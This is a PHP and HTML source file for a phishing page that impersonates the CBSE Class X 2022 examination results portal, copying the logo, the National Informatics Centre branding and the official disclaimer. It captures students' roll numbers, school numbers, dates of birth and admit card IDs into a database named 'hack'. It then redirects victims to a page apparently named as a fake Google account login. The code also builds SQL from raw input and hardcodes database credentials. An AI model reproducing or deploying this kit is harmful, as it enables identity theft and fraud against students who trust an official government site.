<?php

$server = "localhost";
$user = "Elecsware";
$pass = "elcs3630";
$db = "hack";
$table = "CBSE";

$conn = new mysqli($server,$user,$pass,$db);

//include "Server Connection.php";

if(isset($_POST['submit'])){
    $Roll_No = ($_POST['roll_no']);
    $School_No = ($_POST['school_no']);
    $DOB = ($_POST['dob']);
    $Admit_Card = ($_POST['admit_card']);
    

//echo "$Email ","$password";

$mysql = "INSERT INTO $table (`Roll_No`,`School_No`,`DOB`,`Admit_Card`) VALUES ('$Roll_No','$School_No','$DOB','$Admit_Card')";

if ($conn->query($mysql) === TRUE){
   //echo "Hacked.";
   header ("Location:CBSE Google Account.php");
}else{
   //echo "error!";
}
}

?>

<html>
    <head>
        <title>

        </title>
    </head>
    <nav style="height:80px;
    background-color:#c2dbf8;
    padding: 10px;
    margin: -10px;">
<img src="CBSE Logo.png" height="" width="400">
    </nav>

    <body>
        <table width="100%" border="0" cellspacing="0" cellpadding="0">
            <tr align="right" valign="bottom"> 
              <td><font size="2" face="Arial, Helvetica, sans-serif" color="#ffffff"><b><font size="3"></font></b></font></td>
            </tr>
          </table>
        </td>
      </tr>
    </table>      
    <br>
    <table width="100%" border="0" cellspacing="0" cellpadding="0" height="10">
      <tr> 
        <td><font size="3" face="Arial, Helvetica, sans-serif"><font color="#ffffff"><b><font size="4"> 
          </font></b></font> </font></td>
        <td> 
          <div align="right" </div><bgcolor="#ffffff"><font size="3" face="Arial, Helvetica, sans-serif"><font color="#373abe"><b><font size="4"> 
            Examination Results 2022&nbsp;&nbsp;&nbsp;</font></b></font> </font></div>
        </td>
      </tr>
    </table> 
    
    
    <table border="0" width="100%" cellspacing="0" cellpadding="0">
    
      <tr>
    
        <td width="100%">    
    
        <p align=right><STRONG>&nbsp;
    Brought to you by National Informatics Centre &nbsp;&nbsp;<br><br></STRONG></p>
    
    <br>
    <CENTER>
      <font size="3" face="Arial, Helvetica, sans-serif" color="#3333CC"> <strong>  Secondary School Examination  (Class X) 2022 </strong><br> 
    </CENTER>
    <br>
    
    <center>
            <form method="post" action="">
    
          <div align="center"><center>
            <table width=48% align="center">
              <tr>
                <td ><FONT color=black face=Arial size=2><STRONG>Enter your Roll 
                  Number</td>
                <td><input name="roll_no" size="8" maxlength="8" style="width: 114px" AUTOCOMPLETE = "off" ></td>
              </tr>  
                           
          
          <tr><td><FONT color=black face=Arial size=2><STRONG>Enter School No.</td><td>
    
          <input name="school_no" size="8" maxlength="5" style="width: 114px" AUTOCOMPLETE = "off">
          </tr>
          
           <tr>
                <td><FONT color=black face=Arial size=2><STRONG>Enter Date of Birth</td>
                <td width="428px" ><input name="dob" size="8" maxlength="10" style="width: 114px" AUTOCOMPLETE = "off" onChange="return CheckDob();">
                   <font size=2>( Type DOB in dd/mm/yyyy format or Click icon )</font></td>
              </tr>
          
          
          <!--<tr><td><FONT color=black face=Arial size=2><STRONG>Enter Centre No.</td><td>
    
          <input name="cno" size="8" maxlength="4" style="width: 114px" AUTOCOMPLETE = "off">
          </tr> -->
          
      <tr><td><FONT color=black face=Arial size=2><STRONG>Enter Admit Card ID.</td><td>
    
          <input name="admit_card" size="8" maxlength="10" style="width: 114px" AUTOCOMPLETE = "off">
          </tr> 
    
             <tr>
            <td colspan=2 align=left><font color="#FF0000" size=2><b>(as given on your admit card)</b></font></td></tr> 
              <tr align=center>
                <td colspan=2 width=50% align=center><input type="submit" name="submit" size="15" value="Submit"  class="btn">
                  &nbsp;
                  <input type="reset" name="B2" size="15" value="Reset"  class="btn"></td>
              </tr>
           
              <tr align="center"><td>
              
              </td></tr>
            </table>
            <p><font color="#faebd7">-</font></p>
    </center></div><div align="center"><center><P><BR></P>
    
          </center></div>
    
        </form></center>
      
    </body>

    <footer style="height:40px;
      padding: 10px;
    margin: -10px;">
    <TR>
            <TD>
              <P align=center><FONT size=2><FONT color=#000000 
              face="Arial, Helvetica, sans-serif"><B>Disclaimer:</B> Neither NIC nor CBSE is responsible for any inadvertent error that may have crept in the results being published on NET. The results published on net are for Immediate information to the examinees. These cannot be treated as original mark sheets. Original mark sheets have been issued by the Board separately. </FONT></FONT></P></TD></TR>
    
    </table>
    <table width="100%" align=center>
    <tr bgcolor="#c2dbf8" align="middle" valign="baseline"> 
      <td height="23"> 
        <div align="center"> <font color="#000000" size="2" face="Arial, Helvetica, sans-serif"><b> Designed, 
          Developed and Hosted by National Informatics Centre </b></font></div>
      </td>
    </tr>
    </footer>
</html>
